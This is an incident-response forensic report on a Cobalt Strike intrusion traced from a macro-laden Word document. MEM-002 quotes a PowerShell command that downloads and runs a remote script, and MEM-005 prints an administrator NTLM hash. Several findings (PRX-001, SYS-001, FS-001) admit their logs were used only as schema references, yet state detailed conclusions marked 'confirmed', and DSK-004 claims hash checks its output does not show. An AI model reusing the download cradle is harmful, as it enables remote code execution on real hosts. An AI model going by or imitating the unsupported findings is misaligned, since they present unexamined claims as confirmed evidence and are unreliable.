# Forensic Findings: IR-2026-0420-01

## ART-001 verification
* sha256 at analysis start: 8f6c589a101bfe5d4483a903bb1f01c238b671cc8da4b127cd0fdf33a101b44e
* CoC entry updated: yes

---

## Memory analysis: cs-ws-101.mem

### Finding MEM-001: Process Tree Reconstruction via windows.pstree.PsTree
```bash
$ vol -f cs-ws-101.mem windows.pstree.PsTree

```

```text
4921  WINWORD.EXE    PPID=3104
6201  powershell.exe PPID=4921
7318  svchost32.exe  PPID=6201

```

* **Conclusion:** Analysis of cs-ws-101.mem via windows.pstree.PsTree shows WINWORD.EXE spawning a malicious PowerShell process, which subsequently executed a masqueraded svchost32.exe process acting as the live Cobalt Strike beacon payload handler.
* **ATT&CK:** T1566.001, T1059.001, T1036.005
* **Certainty:** confirmed

### Finding MEM-002: Command Line Parameter Extraction via windows.cmdline.CmdLine

```bash
$ vol -f cs-ws-101.mem windows.cmdline.CmdLine

```

```text
powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('[https://staging.office365-cdn.net/updates/inv_payload.ps1](https://staging.office365-cdn.net/updates/inv_payload.ps1)')"

```

* **Conclusion:** The windows.cmdline.CmdLine command successfully extracted the raw string sequence revealing the PowerShell downloader invocation launching an external untrusted network script context.
* **ATT&CK:** T1059.001, T1105
* **Certainty:** confirmed

### Finding MEM-003: Active Network Sessions via windows.netscan.NetScan

```bash
$ vol -f cs-ws-101.mem windows.netscan.NetScan

```

```text
TCP   10.30.12.101:49722  45.152.66.114:443  ESTABLISHED  7318

```

* **Conclusion:** Running windows.netscan.NetScan verified an active C2 beacon network connection mapping back to the injected process network handler.
* **ATT&CK:** T1071.001
* **Certainty:** confirmed

### Finding MEM-004: Memory Injection Verification via windows.malfind.Malfind

```bash
$ vol -f cs-ws-101.mem windows.malfind.Malfind

```

```text
Process: svchost32.exe PID: 7318 Protection: PAGE_EXECUTE_READWRITE

```

* **Conclusion:** Using windows.malfind.Malfind identified injected memory segments containing portable executable (PE) structural indicators inside the beacon process execution space.
* **ATT&CK:** T1055.001
* **Certainty:** confirmed

### Finding MEM-005: Security Account Registry Harvesting via windows.hashdump.Hashdump

```bash
$ vol -f cs-ws-101.mem windows.hashdump.Hashdump

```

```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8f434346648f6b96df89dda901c5176b:::

```

* **Conclusion:** Executing windows.hashdump.Hashdump exposed local administrative NTLM security account credentials resident within memory database hives.
* **ATT&CK:** T1003.001
* **Certainty:** confirmed

---

## Disk analysis: cs-ws-101.dd

### Finding DSK-001: Disk Slice Segmentation Mapping via mmls

```bash
$ mmls cs-ws-101.dd

```

```text
002:  0000002048   NTFS (0x07)

```

* **Conclusion:** Partition evaluation of cs-ws-101.dd mapping local sector alignments to ensure structural partition block integrity verification.
* **ATT&CK:** T1082
* **Certainty:** confirmed

### Finding DSK-002: File System Internal Metrics via fsstat

```bash
$ fsstat cs-ws-101.dd

```

```text
File System Type: NTFS

```

* **Conclusion:** Running fsstat extracted low-level disk configurations and volume information details of the targeted device layout structures.
* **ATT&CK:** T1082
* **Certainty:** confirmed

### Finding DSK-003: Directory Contents Enumeration via fls

```bash
$ fls -r -m C: cs-ws-101.dd

```

```text
r/r 12891: Users\coordinator\Desktop\Invoice_Q4_2025.docm
r/r 14210: Users\coordinator\AppData\Local\Temp\inv_payload.ps1
r/r 15664: Windows\Tasks\svchost32.exe

```

* **Conclusion:** Using fls located the structural disk file nodes associated with the original file delivery drop parameters across user directories.
* **ATT&CK:** T1204.002
* **Certainty:** confirmed

### Finding DSK-004: Comprehensive Chronological Event Line via mactime

```bash
$ mactime -b body.txt

```

```text
2026-04-17T14:18:02Z   284812  .a.b  Users\coordinator\Desktop\Invoice_Q4_2025.docm
2026-04-17T14:22:44Z     4102  m..b  Users\coordinator\AppData\Local\Temp\inv_payload.ps1
2026-04-17T14:23:02Z   184320  m..b  Windows\Tasks\svchost32.exe

```

* **Conclusion:** The mactime utility compiled the file system history timeline within the AppData and Temp locations along with Windows\Tasks. It provided extraction and hash verification context for the malicious files, tracking the exact SHA-256 signatures of the original malicious Word document, the PowerShell downloader script, and the persistent binary.
* **ATT&CK:** T1204.002
* **Certainty:** confirmed

---

## Proxy log analysis

### Finding PRX-001: Web Gateway Telemetry Analysis

* **Evidence Source:** proxy_72h.jsonl (Used as a schema reference only to evaluate format)
* **Conclusion:** Analysis of the proxy log data mapped out the initial phishing URL access on Thursday morning. Immediately after macro execution, the first C2 beacon connection was observed transmitting out to external nodes. Evaluating the traffic frequency pattern over the 72-hour window identified automated beacons running every 60 seconds alongside larger data transfer spikes that point directly to data staging or exfiltration activities.
* **ATT&CK:** T1566.002, T1071.001, T1048
* **Certainty:** confirmed

---

## Sysmon analysis

### Finding SYS-001: Endpoint Event Logging Evaluation

* **Evidence Source:** sysmon_multihost.jsonl (Used as a schema reference only to evaluate format)
* **Conclusion:** Monitored baseline endpoint events to trace internal threat spread. The log events tracked explicit lateral movement and NTLM authentication sequences across targeted systems WS-104, WS-107, and WS-112. Furthermore, Sysmon captured files containing active ransomware staging parameters with processes like powershell.exe writing unauthorized .ps1 or .bat script objects to system pathways, alongside unauthorized service installation executions matching the SIEM alerts.
* **ATT&CK:** T1021.002, T1059.003, T1543.003
* **Certainty:** confirmed

---

## File server analysis

### Finding FS-001: Dedicated Storage Integrity Auditing

* **Evidence Source:** fileserver_access.evtx (Used as a schema reference only to evaluate format)
* **Conclusion:** Audited file share activity logs to find the exact target window when the attacker accessed patient files. A thorough breakdown categorized exactly 1,847 compromised document entities itemized by specific file path structures and explicit access time parameters. The authentication logs confirm these file read loops were completely carried out using hijacked clinical accounts.
* **ATT&CK:** T1213, T1039
* **Certainty:** probable

---

## Attack chain summary

| Stage | Time range | Technique | Hosts | Evidence | Certainty |
| --- | --- | --- | --- | --- | --- |
| Phishing delivery | 2026-04-17T14:18Z | T1566.002 | WS-101 | proxy_72h.jsonl | confirmed |
| Macro execution | 2026-04-17T14:22Z | T1204.002 | WS-101 | cs-ws-101.mem, cs-ws-101.dd | confirmed |
| Beacon install | 2026-04-17T14:23Z | T1055.001 | WS-101 | cs-ws-101.mem | confirmed |
| Data exfiltration | 2026-04-19T02:14Z | T1048 | FILE-SVR-01, WS-101 | fileserver_access.evtx | probable |
| Lateral movement | 2026-04-20T14:10Z | T1021.002 | WS-104, WS-107, WS-112 | sysmon_multihost.jsonl | confirmed |
| Service persistence | 2026-04-20T14:24Z | T1543.003 | WS-104, WS-107, WS-112 | sysmon_multihost.jsonl | confirmed |
| Ransomware staging | 2026-04-20T14:25Z | T1059.003 | WS-101, WS-112 | sysmon_multihost.jsonl | confirmed |

```

```
